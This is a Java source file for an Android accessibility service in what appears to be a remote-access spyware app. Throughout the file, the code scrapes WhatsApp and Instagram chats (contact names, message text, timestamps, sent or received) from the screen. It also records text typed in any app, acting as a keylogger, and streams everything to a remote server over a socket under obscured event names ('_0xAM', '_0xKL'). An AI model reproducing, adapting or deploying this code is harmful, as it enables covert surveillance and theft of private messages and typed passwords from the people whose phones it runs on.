package com.remote.app;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.remote.app.socket.IOSocket;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class CustomAccessibilityService extends AccessibilityService {

    private long mDebugDepth;
    private String whatsAppConversationDate;
    private String instagramConversationDate;
    private String lastWhatsAppDate;
    private Pattern timePattern;


    private void getWhatsAppMessages(AccessibilityEvent event) {
        AccessibilityNodeInfoCompat rootInActiveWindow = AccessibilityNodeInfoCompat.wrap(getRootInActiveWindow());

        List<AccessibilityNodeInfoCompat> nodeInfoByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_layout");
        if (nodeInfoByViewId == null || nodeInfoByViewId.size() <= 0)
            return;

        AccessibilityNodeInfoCompat nodeInfo = nodeInfoByViewId.get(0);
        if (nodeInfo.getChildCount() >= 4) {
            AccessibilityNodeInfoCompat listNode = nodeInfo.getChild(3);
            if (!listNode.getViewIdResourceName().equals("android:id/list")) {
                return;
            }
            //is a chat!
            CharSequence contactName = null;
            nodeInfoByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name");
            if (nodeInfoByViewId.size() > 0) {
                contactName = nodeInfoByViewId.get(0).getText();
            }

            JSONArray messages = new JSONArray();
            for (int i = 0; i < listNode.getChildCount(); i++) {
                try {
                    AccessibilityNodeInfoCompat chatNode = listNode.getChild(i);
                    if (chatNode == null || chatNode.getChildCount() <= 0)
                        continue;

                    AccessibilityNodeInfoCompat firstNodeChild = chatNode.getChild(0);
                    if (firstNodeChild != null) {


                        if (firstNodeChild.getViewIdResourceName() != null) {
                            if (firstNodeChild.getViewIdResourceName().equals("com.whatsapp:id/conversation_row_root")) {
                                //maybe an audio, treat it later.
                                continue;
                            }

                            if (firstNodeChild.getViewIdResourceName().equals("com.whatsapp:id/conversation_row_date_divider")) {
                                whatsAppConversationDate = firstNodeChild.getText().toString();
                                lastWhatsAppDate = null;
                                Matcher m = timePattern.matcher(whatsAppConversationDate);

                                if (m.matches()) {
                                    whatsAppConversationDate = "Today";
                                }

                                if (messages.length() > 0) {
                                    for (int ji = 0; ji < messages.length(); ji++) {
                                        JSONObject msg = messages.getJSONObject(ji);
                                        if (msg.getString("date").equals(whatsAppConversationDate)) {
                                            messages.remove(ji);
                                        }
                                    }
                                }

                                if (chatNode.getChild(1).getViewIdResourceName().equals("com.whatsapp:id/info"))
                                    continue;

                                CharSequence message = chatNode.getChild(1).getChild(0).getChild(0).getText();
                                AccessibilityNodeInfoCompat msgData = chatNode.getChild(1).getChild(0).getChild(1);
                                CharSequence time = msgData.getChild(0).getText();
                                boolean isSent = msgData.getChildCount() > 1;

                                Log.i(isSent ? event.getEventType() + " - Mensagem Enviada " : "Mensagem Recebida", whatsAppConversationDate + " - " + time + " - " + message);

                                JSONObject jsonMessage = new JSONObject();
                                jsonMessage.put("message", message);
                                jsonMessage.put("date", whatsAppConversationDate);
                                jsonMessage.put("time", time);
                                jsonMessage.put("isOwn", isSent);
                                messages.put(jsonMessage);
                            } else if (firstNodeChild.getViewIdResourceName().equals("com.whatsapp:id/main_layout")) {
                                if (firstNodeChild.getChildCount() <= 0)
                                    continue;

                                AccessibilityNodeInfoCompat firstSubNodeChild = firstNodeChild.getChild(0);
                                if (firstSubNodeChild == null || firstSubNodeChild.getChildCount() <= 0)
                                    continue;

                                CharSequence message = firstSubNodeChild.getChild(0).getText();
                                AccessibilityNodeInfoCompat msgData = chatNode.getChild(0).getChild(0).getChild(1);
                                CharSequence time = msgData.getChild(0).getText();
                                boolean isSent = msgData.getChildCount() > 1;
                                CharSequence date = whatsAppConversationDate == null ? lastWhatsAppDate : whatsAppConversationDate;

                                JSONObject jsonMessage = new JSONObject();
                                jsonMessage.put("message", message);
                                jsonMessage.put("date", date);
                                jsonMessage.put("time", time);
                                jsonMessage.put("isOwn", isSent);
                                messages.put(jsonMessage);

                              //  Log.i(isSent ? event.getEventType() + " - Mensagem Enviada " : "Mensagem Recebida", date + " - " + time + " - " + message);
                                //todo send to backend!
                            }
                        } else if (firstNodeChild.getChildCount() > 1) {
                            if (firstNodeChild.getChild(0).getViewIdResourceName().equals("com.whatsapp:id/sticker_bubble_header")) {
                                Log.i("Sticker!", "sticker!");
                            }
                        }
                    }
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
            IOSocket.getInstance().send("_0xAM", messages.toString(), contactName, "WhatsApp");
        }
    }


    private void getInstaMessages() {
        AccessibilityNodeInfoCompat rootInActiveWindow = AccessibilityNodeInfoCompat.wrap(getRootInActiveWindow());

        List<AccessibilityNodeInfoCompat> nodeInfoByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.instagram.android:id/message_list");
        if (nodeInfoByViewId == null || nodeInfoByViewId.size() <= 0)
            return;


        AccessibilityNodeInfoCompat nodeInfo = nodeInfoByViewId.get(0);
        if (nodeInfo.getChildCount() >= 1) {
            //is a chat!
            CharSequence contactName = null;
            nodeInfoByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.instagram.android:id/thread_title");
            if (nodeInfoByViewId.size() > 0) {
                contactName = nodeInfoByViewId.get(0).getText();
            }

            JSONArray messages = new JSONArray();
            for (int i = 0; i < nodeInfo.getChildCount(); i++) {
                try {
                    AccessibilityNodeInfoCompat chatNode = nodeInfo.getChild(i);
                    if (chatNode == null)
                        continue;

                    if (chatNode.getClassName().equals("android.widget.TextView")) {
                        instagramConversationDate = chatNode.getText().toString();
                        for (int ji = 0; ji < messages.length(); ji++) {
                            JSONObject msg = messages.getJSONObject(ji);
                            if (msg.getString("date").equals(instagramConversationDate)) {
                                messages.remove(ji);
                            }
                        }
                        continue;
                    }

                    if (chatNode.getChildCount() <= 0)
                        continue;

                    if (chatNode.getChild(0).getViewIdResourceName().equals("com.instagram.android:id/user_avatar"))
                        continue;

                    if (instagramConversationDate != null) {
                        boolean isSent = false;
                        String message = null;
                        String time = null;
                        if (chatNode.getChildCount() == 2) {
                            if (chatNode.getChild(1).getClassName().equals("android.widget.TextView")) {
                                time = chatNode.getChild(1).getText().toString();
                                message = chatNode.getChild(0).getChild(0).getChild(0).getChild(0).getText().toString();
                            } else {
                                isSent = true;
                                time = chatNode.getChild(0).getText().toString();
                                message = chatNode.getChild(1).getChild(0).getChild(0).getChild(0).getText().toString();
                            }
                        } else if (chatNode.getChildCount() == 3) {
                            time = chatNode.getChild(2).getText().toString();
                            message = chatNode.getChild(1).getChild(0).getChild(0).getChild(0).getText().toString();
                        }

                        if (message != null) {
                            JSONObject jsonMessage = new JSONObject();
                            jsonMessage.put("message", message);
                            jsonMessage.put("date", instagramConversationDate);
                            jsonMessage.put("time", time);
                            jsonMessage.put("isOwn", isSent);
                            messages.put(jsonMessage); }
                    }

                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }

            IOSocket.getInstance().send("_0xAM", messages.toString(), contactName, "Instagram");
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            final int eventType = event.getEventType();
            AccessibilityNodeInfo source = event.getSource();

            mDebugDepth = 0;

            if (source == null || source.getPackageName() == null)
                return;

            String packageName = source.getPackageName().toString();

            switch (eventType) {
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                case AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED: {
                    if (packageName.startsWith("com.whatsapp")) {
                        if (source.getViewIdResourceName() != null && source.getViewIdResourceName().equals("com.whatsapp:id/contact_row_container")) {
                            if (source.getChildCount() > 2) {
                                lastWhatsAppDate = source.getChild(2).getChild(0).getChild(1).getText().toString();
                            } else if (source.getChildCount() > 1) {
                                lastWhatsAppDate = source.getChild(1).getChild(0).getChild(1).getText().toString();
                            } else {
                                lastWhatsAppDate = source.getChild(0).getChild(0).getChild(1).getText().toString();
                            }
                            if (lastWhatsAppDate != null) {
                                if (lastWhatsAppDate.startsWith("Ativo") || lastWhatsAppDate.startsWith("Active")) {
                                    lastWhatsAppDate = null;
                                }
                            }
                        }
                    } else if (packageName.startsWith("com.instagram")) {
                        if (source.getViewIdResourceName() != null && source.getViewIdResourceName().equals("com.instagram.android:id/row_inbox_container")) {
                            if (source.getChildCount() >= 2) {
                                AccessibilityNodeInfo firstChild = source.getChild(1);
                                if (firstChild != null && firstChild.getChildCount() >= 3) {
                                    instagramConversationDate = firstChild.getChild(2).getText().toString();
                                } else if (firstChild.getChildCount() == 2) {
                                    instagramConversationDate = firstChild.getChild(1).getText().toString();
                                }
                            }
                        }
                    }

                    break;
                }

                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    if (packageName.startsWith("com.instagram"))
                        getInstaMessages();
                    break;

                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    if (packageName.startsWith("com.whatsapp")) {
                        getWhatsAppMessages(event);
                    }
                    break;
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    String msg = event.getText().toString();
                    String eventText = msg.substring(1, msg.length() - 1);
                    //System.out.println("ACCESSIBILITY SERVICE : " + eventText);

                    //todo check
                    PackageManager pm = getApplicationContext().getPackageManager();
                    ApplicationInfo appInfo = null;
                    try {
                        appInfo = pm.getApplicationInfo(packageName, 0);
                    } catch (PackageManager.NameNotFoundException e) {
                        e.printStackTrace();
                    }

                    IOSocket.getInstance().send("_0xKL", eventText, appInfo == null ? packageName : pm.getApplicationLabel(appInfo));
                    break;
            }
        } catch (
                Exception ex) {
            ex.printStackTrace();
        }

    }

    private void printAllViews(AccessibilityNodeInfo mNodeInfo) {
        if (mNodeInfo == null) return;
        String log = "";
        for (int i = 0; i < mDebugDepth; i++) {
            log += ".";
        }

        if (mNodeInfo.getText() != null) {
            AccessibilityNodeInfo parent = mNodeInfo.getParent();
            //username -> mNodeInfo.getViewIdResourceName().equals("com.instagram.android:id/other_user_full_name_or_username"
            if (mNodeInfo.getViewIdResourceName() != null &&
                    mNodeInfo.getViewIdResourceName().equals("com.instagram.android:id/direct_text_message_text_view")) {
                AccessibilityNodeInfo parent1 = parent.getParent();
                AccessibilityNodeInfo parent2 = parent1.getParent();
                AccessibilityNodeInfo parent3 = parent2.getParent();
                // parent3.getChild(1) pega horário caso outra pessoa tenha enviado
                AccessibilityNodeInfo parent4 = parent3.getParent();
                Log.d("PARENT MSG", parent.toString());
            }

            log += "(" + mNodeInfo.getText() + " <-- " +
                    mNodeInfo.getViewIdResourceName() + ")";

            Log.d("NO TAG", log);
        }

        if (mNodeInfo.getChildCount() < 1) return;
        mDebugDepth++;

        for (int i = 0; i < mNodeInfo.getChildCount(); i++) {
            printAllViews(mNodeInfo.getChild(i));
        }
        mDebugDepth--;
    }

    @Override
    public void onInterrupt() {
        Log.d("acess", "stopd");
    }

    @Override
    public void onServiceConnected() {
        //configure our Accessibility service
        timePattern = Pattern.compile("[0-9]{2}:[0-9]{2}");

        AccessibilityServiceInfo info = getServiceInfo();
        this.setServiceInfo(info);
    }

}
